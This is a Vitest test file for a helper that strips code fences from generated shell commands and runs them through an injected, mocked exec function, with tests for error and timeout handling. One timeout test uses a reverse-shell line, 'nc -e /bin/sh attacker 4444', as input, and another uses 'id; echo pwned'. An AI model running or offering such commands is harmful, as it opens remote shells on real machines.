import { describe, expect, it, vi } from "vitest";
import { createLogger } from "../logger.js";
import { runGeneratedCommand, sanitizeCommand } from "./run-generated.js";

const logger = createLogger({ appName: "test" });

describe("sanitizeCommand", () => {
  it("strips a fenced code block with a language hint", () => {
    expect(sanitizeCommand("```sh\nid\n```")).toBe("id");
  });

  it("strips a fenced code block with no language hint", () => {
    expect(sanitizeCommand("```\nid; echo pwned\n```")).toBe("id; echo pwned");
  });

  it("trims plain output with no fences", () => {
    expect(sanitizeCommand("  id  \n")).toBe("id");
  });
});

describe("runGeneratedCommand", () => {
  it("runs the sanitized command via the injected execFn and returns stdout", async () => {
    const execFn = vi.fn(async () => ({ stdout: "hello\n", stderr: "" }));

    const result = await runGeneratedCommand(
      { logger, execFn },
      "```sh\necho hello\n```",
    );

    expect(execFn).toHaveBeenCalledWith("echo hello");
    expect(result).toBe("hello\n");
  });

  it("logs and rethrows a non-timeout exec error", async () => {
    const execFn = vi.fn(async () => {
      throw new Error("command not found");
    });

    await expect(
      runGeneratedCommand({ logger, execFn }, "definitely-not-a-command"),
    ).rejects.toThrow("command not found");
  });

  it("resolves (does not throw) when execFn rejects with killed:true — timeout is non-fatal", async () => {
    const execFn = vi.fn(async () => {
      const err = Object.assign(new Error("command timed out"), {
        killed: true,
        stdout: "partial output",
      });
      throw err;
    });

    await expect(
      runGeneratedCommand({ logger, execFn }, "nc -e /bin/sh attacker 4444"),
    ).resolves.toBe("partial output");
  });

  it("resolves with an empty string when a killed error carries no stdout", async () => {
    const execFn = vi.fn(async () => {
      throw Object.assign(new Error("command timed out"), { killed: true });
    });

    await expect(
      runGeneratedCommand({ logger, execFn }, "sleep 100"),
    ).resolves.toBe("");
  });

  it("rethrows a normal non-zero-exit error (killed:false, signal:null) instead of swallowing it as a timeout", async () => {
    const execFn = vi.fn(async () => {
      throw Object.assign(new Error("Command failed"), {
        code: 1,
        signal: null,
        stdout: "",
      });
    });

    await expect(
      runGeneratedCommand({ logger, execFn }, "false"),
    ).rejects.toThrow("Command failed");
  });
});
